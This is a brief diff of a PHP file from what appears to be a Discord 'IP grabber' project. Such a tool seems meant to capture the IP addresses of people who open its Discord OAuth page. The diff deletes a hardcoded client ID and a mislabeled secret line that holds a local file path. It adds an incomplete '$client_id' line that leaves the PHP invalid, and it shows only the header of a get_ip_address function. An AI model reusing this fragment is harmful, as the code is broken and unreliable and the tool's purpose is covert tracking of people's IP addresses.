@@ -2,8 +2,7 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = "668502572348473379"; //CLIENT ID HERE
-$client_secret = "E:\discord grabber\discord-ip-grabber-master"; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$client_id     
 
 function get_ip_address()
 {
